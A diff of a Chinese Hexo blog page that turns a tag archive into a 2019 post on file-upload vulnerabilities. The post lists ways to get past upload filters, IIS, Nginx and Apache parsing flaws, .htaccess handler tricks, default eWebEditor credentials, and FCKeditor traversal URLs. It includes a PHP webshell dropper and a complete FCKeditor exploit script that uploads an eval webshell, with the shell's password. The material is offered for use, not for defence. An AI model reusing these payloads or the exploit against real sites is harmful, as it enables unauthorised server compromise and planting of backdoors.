@@ -6,15 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: 信息收集 | WTF&#39;blog</title>
+  <title>上传漏洞 | WTF&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="WTF&#39;blog">
-<meta property="og:url" content="http://yoursite.com/tags/信息收集/index.html">
+  <meta name="description" content="文件过滤中，如何验证文件后缀">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="上传漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/08/21/上传漏洞/index.html">
 <meta property="og:site_name" content="WTF&#39;blog">
+<meta property="og:description" content="文件过滤中，如何验证文件后缀">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-21T06:52:09.237Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="WTF&#39;blog">
+<meta name="twitter:title" content="上传漏洞">
+<meta name="twitter:description" content="文件过滤中，如何验证文件后缀">
   
     <link rel="alternative" href="/atom.xml" title="WTF&#39;blog" type="application/atom+xml">
   
@@ -150,60 +155,218 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-上传漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/30/googlehacking/" class="archive-article-date">
-  	<time datetime="2019-07-30T03:28:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-30</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/30/googlehacking/">googlehacking</a>
+    <h1 class="article-title" itemprop="name">
+      上传漏洞
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/08/21/上传漏洞/" class="archive-article-date">
+  	<time datetime="2019-08-21T06:48:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文件过滤中，如何验证文件后缀</p>
+<a id="more"></a>
+<p>1.文件头验证<br>2.文件类型验证<br>3.文件后缀验证</p>
+<p>修改文件头，伪造文件属性<br>修改文件类型，伪造文件类型，MIME绕过（抓包改包）<br>增加多重后缀，伪造文件后缀，命名绕过</p>
+<p>Js本地验证<br>%00截断上传<br>(k1.php%00.jpg)   %00—&gt;url编码<br>Burp抓包</p>
+<p>常见的MIME类型<br>　　超文本标记语言文本 .html text/html<br>　　普通文本 .txt text/plain<br>　　RTF文本 .rtf application/rtf<br>　　GIF图形 .gif image/gif<br>　　JPEG图形 .jpeg,.jpg image/jpeg<br>　　au声音文件 .au audio/basic<br>　　MIDI音乐文件 mid,.midi audio/midi,audio/x-midi<br>　　RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio<br>　　MPEG文件 .mpg,.mpeg video/mpeg<br>　　AVI文件 .avi video/x-msvideo<br>　　GZIP文件 .gz application/x-gzip<br>　　TAR文件 .tar application/x-tar</p>
+<p>编辑器上传漏洞利用<br>网站编辑器：<br>Eweb,fck,ce,cfinder,ck  第三方组件<br>编辑器漏洞利用：<br>获取编辑器的名称及版本信息<br>扫描爬行或字典扫描 探针<br>观察图片的地址或编辑器特征<br>获取编辑器相关的漏洞<br>利用编辑器漏洞进行攻击测试<br>Ewebeditor：<br>默认后台：ewebeditor/admin_login.asp<br>默认数据库：ewebeditor/db/ewebeditor.mdb<br>默认账号密码：admin admin/admin888<br>FCK<br>查看版本：/_whatsnew.html<br>编辑器页：/_samples/default.html<br>.htaccess<br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p>代码：<br>&lt;filesmatch “wtf”&gt;<br>sethandler application/x-httpd-php<br><br>实战意义：<br>1.如果存在可以上传.htaccss文件，就可以直接利用规则解析<br>2.如果存在修改.htaccess文件权限，修改解析规则<br>IIS 5.x/6.0解析漏洞<br>IIS 6.0解析利用方法有两种<br>1.目录解析<br>/xx.asp/xx.jpg<br>2.文件解析<br>xx.asp;.jpg<br>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>例如创建目录 xx.asp，那么<br>/xx.asp/1.jpg<br>将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。<br>第二种，在IIS6.0下，分号后面的不被解析，也就是说<br>xx.asp;.jpg<br>会被服务器看成是xx.asp<br>还有IIS6.0 默认的可执行文件除了asp还包含这三种<br>/xx.asa /xx.cer /xx.cdx<br>IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞<br>Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…<br>在默认Fast-CGI开启状况下,黑阔上传一个名字为xx.jpg，内容为<br><?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>‘);?&gt;<br>的文件，然后访问xx.jpg/.php,在这个目录下就会生成一句话木马 shell.php<br>Nginx &lt;8.03 空字节代码执行漏洞<br>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问<br>xxx.jpg%00.php<br>来执行其中的代码<br>Apache解析漏洞<br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.<br>比如 xx.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把xx.php.owf.rar解析成php.<br>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个wooyun.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀<br>其他<br>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。<br>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:<br>&lt;FilesMatch “xx.jpg”&gt; SetHandler application/x-httpd-php <br>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。</p>
+<p>FCK编辑器漏洞<br>/3/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=%2F&amp;NewFolderName=a<br>CurrentFolder=/&amp;NewFolderName=a   /a<br>CurrentFolder=/a,asp&amp;NewFolderName=a     /a.asp/a<br>Ewebeditror   fck漏洞利用<br>目录遍历<br>/ewebeditor/admin_uploadfile.asp?id=42&amp;dir=../../..<br>FCK=&lt;=2.63 EXP<br><?php
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+define(STDIN, fopen("php://stdin", "r"));
+$match = array();
+function http_send($host, $packet)
+{
+$sock = fsockopen($host, 80);
+while (!$sock)
+{
+print "\n[-] No response from {$host}:80 Trying again...";
+$sock = fsockopen($host, 80);
+}
+fputs($sock, $packet);
+while (!feof($sock)) $resp .= fread($sock, 1024);
+fclose($sock);
+print $resp;
+return $resp;
+}
+function connector_response($html)
+{
+global $match;
+return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));
+}
+print "\n+------------------------------------------------------------------+";
+print "\n| FCKEditor Servelet Arbitrary File Upload Exploit |";
+print "\n+------------------------------------------------------------------+\n";
+if ($argc < 3)
+{
+print "\nUsage......: php $argv[0] host path\n";
+print "\nExample....: php $argv[0] localhost /\n";
+print "\nExample....: php $argv[0] localhost /FCKEditor/\n";
+die();
+}
+$host = $argv[1];
+$path = ereg_replace("(/){2,}", "/", $argv[2]);
+$filename = "fvck.gif";
+$foldername = "fuck.php%00.gif";
+$connector = "editor/filemanager/connectors/php/connector.php";
+$payload = "-----------------------------265001916915724\r\n";
+$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
+$payload .= "Content-Type: image/jpeg\r\n\r\n";
+$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[wtf]) ?>‘.”\n”;<br>$payload .= “—————————–265001916915724–\r\n”;<br>$packet = “POST {$path}{$connector}?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=”.$foldername.” HTTP/1.0\r\n”;//print $packet;<br>$packet .= “Host: {$host}\r\n”;<br>$packet .= “Content-Type: multipart/form-data; boundary=—————————265001916915724\r\n”;<br>$packet .= “Content-Length: “.strlen($payload).”\r\n”;<br>$packet .= “Connection: close\r\n\r\n”;<br>$packet .= $payload;<br>print $packet;<br>if (!connector_response(http_send($host, $packet))) die(“\n[-] Upload failed!\n”);<br>else print “\n[-] Job done! try http://${host}/$match[2] \n”;<br>?&gt;<br>webshell密码：wtf</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">信息收集</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">漏洞</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/21/上传漏洞/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2019/08/20/MSF简单使用/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">MSF简单使用</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -226,9 +389,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
